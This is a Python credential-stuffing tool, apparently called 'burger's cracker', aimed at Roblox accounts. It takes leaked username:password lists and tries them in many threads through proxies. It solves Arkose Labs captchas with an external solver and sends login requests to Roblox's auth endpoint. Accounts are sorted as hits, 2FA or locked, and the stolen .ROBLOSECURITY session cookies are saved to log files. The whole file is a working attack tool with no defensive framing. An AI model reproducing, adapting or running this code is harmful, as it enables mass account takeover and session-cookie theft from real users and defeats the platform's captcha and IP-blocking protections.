## burger's cracker (type-1 solving)
## h0nda
## Created: 2020-09-02
## Last updated: 2020-09-02


from http.client import HTTPSConnection
from urllib.parse import urlparse
from datetime import datetime, timedelta
from io import BytesIO
import gzip
import json
import string
import random
import secrets
import time
import threading
import sys
import os
import itertools
import ctypes
import requests
import yaml
from solver import Solver

solver = Solver(
    public_key="9F35E182-C93C-EBCC-A31D-CF8ED317B996",
    service_url="https://roblox-api.arkoselabs.com",
    proxies=open("proxies.txt").read().splitlines()
)

## define globals
combos = []
proxies = []
combo_lock = threading.Lock()
check_counter = None
checked_count = 0
total_count = 0
hit_count = 0
locked_count = 0
tfa_count = 0

## load config into memory
with open("config.yaml", encoding="UTF-8", errors="ignore") as f:
    config = yaml.safe_load(f)
    thread_count = config["threads"]
    solver_count = config["solvers"]
    resubmitter_count = config["resubmitters"]
    user_agent = config["user_agent"]
    del config


## define exceptions
class NoCombosLeft(Exception): pass
class RequestError(Exception): pass
class InvalidXsrfToken(Exception): pass
class InvalidCredentials(Exception): pass
class AccountLocked(Exception): pass
class InaccessibleAccount(Exception): pass
class CaptchaRequired(Exception): pass
class TwoStepVerification(Exception): pass
class BlockedIP(Exception): pass
error_code_assoc = {
    "default": Exception,
    0: InvalidXsrfToken,
    1: InvalidCredentials,
    2: CaptchaRequired,
    4: AccountLocked,
    6: InaccessibleAccount,
    10: InaccessibleAccount,
    12: InaccessibleAccount,
    14: InaccessibleAccount,
    5: InaccessibleAccount,
    403: BlockedIP
}


## class for counting cpm
class IntervalCounter:
    def __init__(self, interval=60):
        self.interval = interval
        self._list = list()
    
    def add(self):
        self._list.append(time.time())
    
    def get_cpm(self):
        self._list = list(filter(
            lambda x: (time.time()-x)<=60,
            self._list
        ))
        cpm = len(self._list)
        return cpm


## class for combos
class Combo:
    username: str
    password: str
    cookie: str

    def __init__(self, username, password):
        self.username = username
        self.password = password
        self.cookie = None
    
    def __hash__(self):
        return hash((self.username.lower(), self.password))

    def __eq__(self, c2):
        return hash(self) == hash(c2)


## thread for checking combos
class CheckWorker(threading.Thread):
    def __init__(self):
        self.conn = None
        super().__init__()

    def run(self):
        global checked_count
        global hit_count, locked_count, tfa_count
        
        while 1:
            try:
                combo = get_combo()
            except NoCombosLeft:
                return

            ch = solver.get_solve()

            try:
                user, cookie = check_login(combo, ch)
                combo.username = user["name"]
                combo.cookie = cookie
                hit_count += 1
                checked_count += 1
                check_counter.add()
                solver.resubmit(ch)
                print("Hit: %s" % combo.username)
                write_log("combos", "%s:%s" % (combo.username, combo.password))
                write_log("cookies", "%s" % (combo.cookie))
                write_log("combos_cookies", "%s:%s:%s" % (combo.username, combo.password, combo.cookie.replace("WARNING:", "WARNING")))

            except TwoStepVerification:
                tfa_count += 1
                checked_count += 1
                check_counter.add()
                solver.resubmit(ch)
                print("2FA: %s" % combo.username)
                write_log("2fa", "%s:%s" % (combo.username, combo.password))

            except AccountLocked:
                locked_count += 1
                checked_count += 1
                check_counter.add()
                solver.resubmit(ch)
                print("Locked: %s" % combo.username)
                write_log("locked", "%s:%s" % (combo.username, combo.password))
            
            except InvalidCredentials:
                checked_count += 1
                check_counter.add()
                solver.resubmit(ch)
                print("Invalid: %s:%s" % (combo.username, combo.password))
            
            except InaccessibleAccount:
                checked_count += 1
                check_counter.add()
                solver.resubmit(ch)

            except (InvalidXsrfToken, CaptchaRequired, RequestError, \
                BlockedIP, json.JSONDecodeError):
                put_combo(combo)

            except Exception as err:
                print("Check-Worker error:", type(err), err)
                put_combo(combo)


## thread for updating window title
class TitleWorker(threading.Thread):
    def __init__(self, interval=0.1):
        self.interval = interval
        super().__init__()
    
    def run(self):
        while total_count > checked_count:
            time.sleep(self.interval)
            ctypes.windll.kernel32.SetConsoleTitleW("  |  ".join([
                "burger's cracker (type-1 solving)",
                "CPM: %d" % check_counter.get_cpm(),
                "Progress: %d/%d (%.2f%%)" % (checked_count, total_count, checked_count/total_count*100),
                "Hits/Locked/2FA: %d/%d/%d" % (hit_count, locked_count, tfa_count)
            ]))


## response error handling
def raise_on_error(resp):
    if "twoStepVerificationData" in resp:
        raise TwoStepVerification
    if not "errors" in resp: return
    for err in resp["errors"]:
        raise error_code_assoc.get(err["code"], error_code_assoc["default"]) \
            ("%s (%d)" % (err["message"], err["code"]))

## check roblox login
def check_login(combo: Combo, ch):
    def send_request():
        try:
            resp = requests.post(
                url="https://auth.roblox.com/v2/login",
                headers={"User-Agent": ch.fp.user_agent, "X-CSRF-TOKEN": ch.proxy.xsrf_token or "-"},
                json=dict(ctype="Username" if not "@" in combo.username else "Email", \
                          cvalue=combo.username, password=combo.password,
                          captchaToken=ch.full_token, captchaProvider="PROVIDER_ARKOSE_LABS"),
                proxies=dict(https="https://%s:%d" % (ch.proxy.host, ch.proxy.port))
            )
        except Exception:
            raise RequestError
        data = resp.json()
        return resp, data

    resp, data = send_request()
    
    if "x-csrf-token" in resp.headers:
        ch.proxy.xsrf_token = resp.headers["x-csrf-token"]
        resp, data = send_request()
    
    raise_on_error(data)
    return data["user"], resp.cookies[".ROBLOSECURITY"]


## combo handling
def get_combo():
    with combo_lock:
        if not combos:
            raise NoCombosLeft
        combo = combos.pop()
        return combo

def put_combo(combo):
    combos.append(combo)

def write_log(category, log):
    with open(os.path.join("logs", "%s.txt"%category), "a", encoding="UTF-8", \
        errors="ignore") as f:
        f.write("%s\n" % log)
        f.flush()


## create output dir
if not os.path.exists("./logs"):
    os.mkdir("./logs")


## load combos into memory
print("Loading combos ..")
with open("combos.txt" if len(sys.argv)<2 else sys.argv[1], errors="ignore", encoding="UTF-8") as f:
    for line in f.read().splitlines():
        v = line.split(":")
        if len(v) < 2: continue
        if len(v[0]) < 2 or len(v[0]) > 50: continue
        c = Combo(v[0], v[1])
        combos.append(c)
    combos = list(set(combos))
    total_count = len(combos)
    print("%d unique combos loaded" % total_count)


## cpm counter
check_counter = IntervalCounter()

## start check-threads
print("Starting threads ..")
TitleWorker().start()
ct = [CheckWorker() for _ in range(thread_count)]
for t in ct: t.start()
solver.start(solver_count, resubmitter_count)
print("All threads are now running!")

## wait for finish
for t in ct: t.join()
print("Completed! %d/%d combos checked" % (checked_count, total_count))